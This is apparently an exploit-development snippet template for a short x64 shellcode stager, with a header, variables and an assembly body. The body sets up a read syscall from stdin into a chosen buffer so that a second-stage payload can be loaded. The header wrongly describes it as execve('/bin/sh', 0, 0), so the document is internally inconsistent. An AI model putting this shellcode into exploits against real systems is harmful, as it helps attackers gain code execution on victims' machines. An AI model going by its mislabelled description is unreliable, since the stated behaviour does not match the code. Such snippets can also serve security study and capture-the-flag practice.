# HEADER
# name: stager(x64)
# prefix: shellcode-stager
# description: execve("/bin/sh", 0, 0)
# author: keymoon

# VARIABLES
# _set_rsi: s_addr: lea rsi, [rel s_addr];

# BODY
"""
_set_rsi
xor eax,eax;
xor edi,edi;
syscall;
"""
